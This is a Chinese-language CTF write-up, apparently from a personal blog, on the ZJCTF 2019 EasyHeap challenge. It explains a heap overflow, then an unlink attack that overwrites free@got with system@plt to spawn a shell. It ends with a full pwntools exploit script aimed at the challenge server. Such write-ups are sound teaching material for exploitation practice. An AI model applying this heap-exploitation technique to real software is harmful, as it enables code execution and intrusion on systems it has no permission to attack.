---
title: ZJCTF 2019 EasyHeap
tags: [ctf-pwn,exp]
date: 2022-11-29 15:09:00
excerpt: unlink 漏洞例题
---

#### 题目链接

<https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>

#### 漏洞

很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑

因此可以溢出

#### 利用

checksec发现没有开启PIE，heaparray的地址可以直接使用

1. 首先申请三个chunk

   ```python
   add(0x90,b"MMMM")
   add(0x90,b"MMMM")
   add(0x20,b"/bin/sh\x00")
   ```

2. 构造一个unlink需要在第一个chunk内构造一个fakechunk

   ```python
   fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)
   fake_chunk = fake_chunk.ljust(0x90,b'M')
   fake_chunk += p64(0x90) + p64(0xa0)
   edit(0,0x100,fake_chunk)
   ```

   ![](/img/[ZJCTF2019]EasyHeap/1.jpg)

   对于chunk 0，`fd = heaparray - 0x18` `bk = heaparray - 0x10`，unlink chunk 0 时会将heaparray[0]指向`heaparray - 0x18`

3. 这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin

   ![](/img/[ZJCTF2019]EasyHeap/2.jpg)

   查看heaparray地址上的值：
   
   ![](/img/[ZJCTF2019]EasyHeap/3.jpg)
   
   说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8
   
4. 这时edit(0)会从0x6020c8这个地址开始写，因此

   ```python
   payload = p64(0)*3 +p64(free_got)
   edit(0,0x20 ,payload)
   ```

   又一次覆盖了heaparray[0]，指向了`free@got`

5. 这时edit(0)会修改`free@got`的内容

   ```python
   edit(0,8,p64(system_plt))
   ```

   将其函数改为system函数的plt表

   > 因为system没有被调用过，不能直接改成system@got

6. delete(2)会调用free("/bin/sh")，而free函数被替换成了system，因此得到了shell

#### 完整exp

```python
from pwn import *
r = remote("node4.buuoj.cn",27679)
elf = ELF("./easyheap")
def add(size,content):
    r.recvuntil("Your choice :")
    r.sendline('1')
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap:")
    r.sendline(content)
def edit(idx, size, content):
    r.recvuntil("Your choice :")
    r.sendline('2')
    r.recvuntil("Index :")
    r.sendline(str(idx))
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap : ")
    r.sendline(content)
def delete(idx):
    r.recvuntil("Your choice :")
    r.sendline('3')
    r.recvuntil("Index :")
    r.sendline(str(idx))

heaparray_addr = 0x6020E0
system_plt = elf.plt['system']
free_got = elf.got['free']

add(0x90,b"MMMM")
add(0x90,b"MMMM")
add(0x20,b"/bin/sh\x00")
#gdb.attach(r)

fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)
fake_chunk = fake_chunk.ljust(0x90,b'M')
fake_chunk += p64(0x90) + p64(0xa0)
edit(0,0x100,fake_chunk)
delete(1)
#gdb.attach(r)
payload = p64(0)*3 +p64(free_got)
edit(0,0x20 ,payload)
#gdb.attach(r)
edit(0,8,p64(system_plt))
delete(2)
r.interactive()
```

